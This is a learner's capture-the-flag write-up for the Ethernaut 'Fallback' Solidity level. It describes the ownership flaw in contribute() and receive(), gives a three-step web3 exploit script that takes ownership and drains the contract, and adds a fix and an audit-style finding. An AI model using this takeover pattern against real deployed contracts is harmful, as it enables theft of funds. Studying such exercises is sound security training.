## Level 1 — Fallback

**Vulnerability:**
In contract Fallback, function contribute and receive can be exploited due to different parameters to becoming contract owner as defined in constructor and restricted in modifier.

**Independent Finding:**
I found redundencies in both these functions and knew this could be the exploit.

**Gaps:**
I can not write the code from scratch - will work on that, being able to put together the contract just using knowledge of methods and syntax.

**Exploit:**
```js
// Step 1: contribute a small amount to make contributions[msg.sender] > 0
await contract.contribute({value: web3.utils.toWei(".00001", "ether")})

// Step 2: trigger receive() with a plain ETH transfer (no calldata)
await web3.eth.sendTransaction({ to: contract.address, from: player, value: web3.utils.toWei("0.0001", "ether")})

// Step 3: now owner === player, drain the contract
await contract.withdraw()
```

**Fix:**
You can get rid of receive() external payable all together, or if changing ownership is the intention you can say in the receive function:
```solidity
require(msg.value > 0 && contributions[msg.sender] > contributions[owner]);
```

**Audit Flag:**
[High] Inconsistent ownership checks between contribute() and receive() allow any address to trivially become owner, resulting in complete drainage of contract funds via withdraw().

**Solodit Match:**
[TODO - find and link a real access-control/ownership-takeover finding from Solodit]

---
